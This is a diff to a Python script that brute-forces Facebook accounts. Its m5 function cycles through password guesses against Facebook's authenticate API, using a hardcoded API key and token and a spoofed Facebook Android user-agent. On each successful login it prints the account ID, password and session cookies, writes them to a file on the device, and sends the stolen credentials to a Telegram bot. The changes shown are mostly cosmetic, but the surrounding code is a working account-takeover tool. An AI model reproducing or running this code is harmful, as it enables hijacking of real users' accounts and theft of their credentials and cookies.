@@ -388,8 +388,7 @@ BH = '\x1b[1;102m'
 BM = '\x1b[1;101m' 
 BA = '\x1b[1;100m' 
 my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
+ P, M, H, K, B, U, N, R, Y,]
 orange = "\x1b[38;5;196m"
 yellow = "\x1b[38;5;208m"
 black="\033[1;30m"
@@ -1307,6 +1306,7 @@ def m5(idf,pwv):
     try:
       for pw in pwv:
             useragent = str(sexua())
+            warna = random.choice(my_color)
             data = {'adid':str(uuid.uuid4()),
             'format':'json',
             'device_id':str(uuid.uuid4()),
@@ -1328,7 +1328,7 @@ def m5(idf,pwv):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head = {'User-Agent': useragent,
+            head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=2.625,width=1080,height=2123};FBLC/tr_TR;FBRV/525469090;FB_FW/2;FBCR/TM CELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
@@ -1354,8 +1354,8 @@ def m5(idf,pwv):
                     ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                     res = requests.get(ckk).text
                     if 'Photoshop' in res:
-                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
-                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            print('\r\r\033[1;32m[ATOM-OK] '+uid+' | '+pw)
+                            print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m")
                             open('/sdcard/ATOM-OK-cookies.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                             statusok = (f" {user} | {ps} | {coki} ")
                             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
